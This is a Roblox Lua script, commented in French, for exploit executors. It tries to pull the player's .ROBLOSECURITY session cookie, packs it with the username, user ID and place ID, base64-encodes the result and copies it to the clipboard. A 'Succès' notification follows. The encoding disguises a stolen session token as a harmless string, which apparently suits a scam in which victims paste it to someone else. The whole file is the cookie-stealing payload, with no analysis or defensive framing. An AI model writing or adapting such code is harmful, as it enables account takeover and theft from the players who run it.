-- Compatible Android / PC selon exécuteur (setclipboard requis)
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Fonction pour obtenir le cookie .ROBLOSECURITY
local function getCookie()
    local cookie = ""
    if syn then
        local res = syn.request({ Url = "https://roblox.com", Method = "GET" })
        if res and res.Cookies then cookie = res.Cookies[".ROBLOSECURITY"] end
    elseif http and http.request then
        local res = http.request({ Url = "https://roblox.com", Method = "GET" })
        if res and res.Cookies then cookie = res.Cookies[".ROBLOSECURITY"] end
    elseif request then
        local res = request({ Url = "https://roblox.com", Method = "GET" })
        if res and res.Cookies then cookie = res.Cookies[".ROBLOSECURITY"] end
    end
    return cookie or "Cookie non trouvé"
end

-- Fonction pour copier un texte en Base64
local function copyToClipboardBase64(token, userId, userName)
    -- Texte simple à copier
    local text = "Nom: "..userName.."\nID: "..userId.."\nToken: "..token.."\nPlace: "..game.PlaceId.."\nTemps: "..os.time().."\nPlateforme: Android / Clipboard"
    
    -- Encodage Base64
    local base64Data = HttpService:EncodeBase64(text)
    
    if setclipboard then
        setclipboard(base64Data)
        print("Texte copié en Base64 dans le presse‑papier")
    else
        warn("setclipboard non supporté sur cet exécuteur")
        print(base64Data)
    end
end

-- Exécution principale
local cookie = getCookie()
if cookie ~= "Cookie non trouvé" then
    copyToClipboardBase64(cookie, player.UserId, player.Name)
else
    warn("Cookie non récupéré")
end

-- Notification locale
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Succès",
    Text = "Texte copié en Base64 dans le presse‑papier",
    Duration = 5
})
